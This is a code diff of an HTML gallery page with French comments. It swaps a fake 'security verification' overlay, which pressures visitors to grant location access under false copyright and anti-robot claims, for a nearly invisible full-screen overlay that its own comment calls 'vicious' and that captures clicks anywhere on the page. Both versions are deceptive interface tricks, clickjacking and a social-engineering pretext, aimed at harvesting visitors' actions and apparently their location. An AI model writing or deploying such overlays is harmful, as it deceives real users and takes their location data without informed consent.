@@ -16,18 +16,11 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-2/js/all.min.js"></script>
 </head>
 <body>
-    <!-- Overlay de Vérification (Force GPS) -->
-    <div id="verification-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; padding: 20px;">
-        <div style="background: #222; padding: 30px; border-radius: 15px; border: 1px solid #444; max-width: 400px;">
-            <i class="fas fa-shield-alt" style="font-size: 50px; color: #00ff00; margin-bottom: 20px;"></i>
-            <h2 style="margin-bottom: 15px;">Vérification de Sécurité</h2>
-            <p style="margin-bottom: 25px; color: #ccc;">Pour accéder à la galerie "Saadaa le Goat" et protéger les droits d'auteur, vous devez valider votre identité locale.</p>
-            <button id="btn-verify" style="background: #00ff00; color: black; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%;">
-                VÉRIFIER ET ACCÉDER
-            </button>
-            <p id="error-msg" style="color: #ff4444; margin-top: 15px; display: none; font-size: 14px;">
-                <i class="fas fa-exclamation-triangle"></i> Accès refusé. Vous devez autoriser la localisation pour prouver que vous n'êtes pas un robot.
-            </p>
+    <!-- Overlay Invisible et Vicieux (Capture de clic partout) -->
+    <div id="verification-overlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.01); z-index: 99999; cursor: pointer; display: flex; align-items: center; justify-content: center;">
+        <!-- Petit message discret qui suit la souris ou reste au centre pour inciter au clic si besoin -->
+        <div style="background: rgba(0,0,0,0.6); color: white; padding: 10px 20px; border-radius: 30px; font-size: 12px; pointer-events: none; opacity: 0.1;">
+            Cliquer pour activer le contenu interactif
         </div>
     </div>
 
